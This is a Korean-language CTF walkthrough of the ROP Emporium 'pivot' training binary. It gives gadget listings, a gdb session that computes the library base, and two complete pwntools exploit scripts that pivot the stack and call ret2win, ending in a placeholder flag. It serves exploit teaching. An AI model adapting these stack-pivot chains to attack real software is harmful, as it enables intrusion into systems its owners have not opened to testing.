# [pivot](https://ropemporium.com/challenge/pivot.html)
<br />

**Description:**
> There's only enough space for a small ROP chain on the stack,
but you've been given space to stash a much larger chain elsewhere.
Learn how to pivot the stack onto a new location.

<br />
<br />

# x86_64

**Binary Protections:**
```yaml
pivot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0e9fb878206e1858b042597fd36c51aa07497121, not stripped

[*] '/home/kali/ROP/pivot'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
```
<br />

문제에서 제공되는 바이너리에는 라이브러리로부터 링크되어 있지 않은 함수 `ret2win` 이 포함되어 있으며, 이 함수의 실제 주소를 계산하여 직접 호출하는 것으로 문제를 풀 수 있습니다.

문제를 풀기 위해서 필요한 가젯을 찾겠습니다.

```yaml
$ objdump -d pivot
Disassembly of section .text:
...
00000000004009a8 <uselessFunction>:
  4009a8:       55                      push   %rbp
  4009a9:       48 89 e5                mov    %rsp,%rbp
  4009ac:       e8 6f fd ff ff          call   400720 <foothold_function@plt>
  4009b1:       bf 01 00 00 00          mov    $0x1,%edi
  4009b6:       e8 95 fd ff ff          call   400750 <exit@plt>

00000000004009bb <usefulGadgets>:
  4009bb:       58                      pop    %rax
  4009bc:       c3                      ret
  4009bd:       48 94                   xchg   %rax,%rsp
  4009bf:       c3                      ret
  4009c0:       48 8b 00                mov    (%rax),%rax
  4009c3:       c3                      ret
  4009c4:       48 01 e8                add    %rbp,%rax
  4009c7:       c3                      ret
  4009c8:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
```
- `pop rax ; ret = 0x4009bb`
- `xchg rsp, rax ; ret = 0x4009bd`

`ret2win`의 실제 주소를 계산하기 위해서 제공된 주소를 가지고 라이브러리 베이스를 구하겠습니다.

<br />

```bash
$ gdb pivot -q
...
pwndbg> b *pwnme+113
Breakpoint 1 at 0x400962
pwndbg> r
...
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7a08f10
Send a ROP chain now and it will land there
>
...

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
	...
    0x7ffff7c00000     0x7ffff7c01000 r-xp     1000      0 /home/kali/ROP/libpivot.so
    0x7ffff7c01000     0x7ffff7e00000 ---p   1ff000   1000 /home/kali/ROP/libpivot.so
    0x7ffff7e00000     0x7ffff7e01000 r--p     1000      0 /home/kali/ROP/libpivot.so
    0x7ffff7e01000     0x7ffff7e02000 rw-p     1000   1000 /home/kali/ROP/libpivot.so
    ...

pwndbg> p/x 0x7ffff7c00000 - 0x7ffff7a08f10
$1 = 0x1f70f0
```
라이브러리 베이스와 제공된 버퍼의 거리는 `0x1f70f0` 입니다. 라이브러리 베이스에 `ret2win`의 심볼 주소를 더하면 `ret2win`의 실제 주소를 계산할 수 있습니다.

<br />

```yaml
$ readelf -s libpivot.so | grep ret2win
    18: 0000000000000a81   146 FUNC    GLOBAL DEFAULT   12 ret2win
    48: 0000000000000a81   146 FUNC    GLOBAL DEFAULT   12 ret2win
```
`ret2win`의 심볼 주소는 `0xa81`입니다. 위 정보를 가지고 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

p = process('./pivot')

pop_rax = 0x4009bb
xchg = 0x4009bd

p.recvuntil(b'0x')
buf = int(p.recvline()[:-1], 16)
libc_base = buf + 0x1f70f0
ret2win = libc_base + 0xa81

pay = flat({40:pop_rax}, buf, xchg)

p.sendlineafter(b'>', p64(ret2win))
p.sendlineafter(b'>', pay)
p.interactive()
```
```bash
$ python3 test.py
Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```
***

<br />

위처럼 라이브러리 베이스에 심볼을 더해 실제 주소를 구하는 방법도 있지만, 문제에서 의도하는 방법으로 풀면 아래처럼 풀이할 수 있습니다.

<br />

```yaml
$ objdump -d pivot
Disassembly of section .text:
...
00000000004009a8 <uselessFunction>:
  4009a8:       55                      push   %rbp
  4009a9:       48 89 e5                mov    %rsp,%rbp
  4009ac:       e8 6f fd ff ff          call   400720 <foothold_function@plt>
  4009b1:       bf 01 00 00 00          mov    $0x1,%edi
  4009b6:       e8 95 fd ff ff          call   400750 <exit@plt>

00000000004009bb <usefulGadgets>:
  4009bb:       58                      pop    %rax
  4009bc:       c3                      ret
  4009bd:       48 94                   xchg   %rax,%rsp
  4009bf:       c3                      ret
  4009c0:       48 8b 00                mov    (%rax),%rax
  4009c3:       c3                      ret
  4009c4:       48 01 e8                add    %rbp,%rax
  4009c7:       c3                      ret
  4009c8:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
```
```yaml
$ ROPgadget --binary pivot | grep "pop rbp"
0x00000000004007c8 : pop rbp ; ret
```
```yaml
$ ROPgadget --binary pivot | grep "call rax"
0x00000000004006b0 : call rax
```
- `pop rax ; ret = 0x4009bb`
- `xchg rsp, rax ; ret = 0x4009bd`
- `mov rax, [rax] ; ret = 0x4009c0`
- `add rax, rbp ; ret = 0x4009c4`
- `pop rbp ; ret = 0x4007c8`
- `call rax = 0x4006b0`

필요한 가젯을 전부 구했으므로, `ret2win`의 실제 주소만 구하면 됩니다. `foothold` 함수로 `ret2win`과의 거리를 계산할 수 있습니다.

<br />

```yaml
$ readelf -s libpivot.so | grep ret2win
    48: 0000000000000a81   146 FUNC    GLOBAL DEFAULT   12 ret2win
$ readelf -s libpivot.so | grep foothold
    55: 000000000000096a    19 FUNC    GLOBAL DEFAULT   12 foothold_function
```
두 주소의 거리는 `0x117` 입니다.

위에서 구한 정보를 가지고 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

e = ELF("./pivot")
p = e.process()

p.recvuntil(b'0x')
buf_addr = int(p.recvline()[:-1], 16)

foothold_plt = e.plt["foothold_function"]
foothold_got = e.got["foothold_function"]
add_rax_rbp = 0x4009c4
pop_rbp = 0x4007c8
pop_rax = 0x4009bb
mov_rax = 0x4009c0
call_rax = 0x4006b0
xchg = 0x4009bd

pay = flat(
	foothold_plt,          # call foothold_function@plt
	pop_rax, foothold_got, # rax = [foothold_function@got]
	mov_rax,               # rax = foothold_function@got
	pop_rbp, 0x117,        # rbp = 0x117
	add_rax_rbp,           # rax = ret2win
	call_rax               # call ret2win
)

pay1 = flat({40:pop_rax}, buf_addr, xchg)

p.sendlineafter(b'>', pay)
p.sendlineafter(b'>', pay1)
p.interactive()
```
```bash
$ python3 test.py
Thank you!
foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
ROPE{a_placeholder_32byte_flag!}
$
```
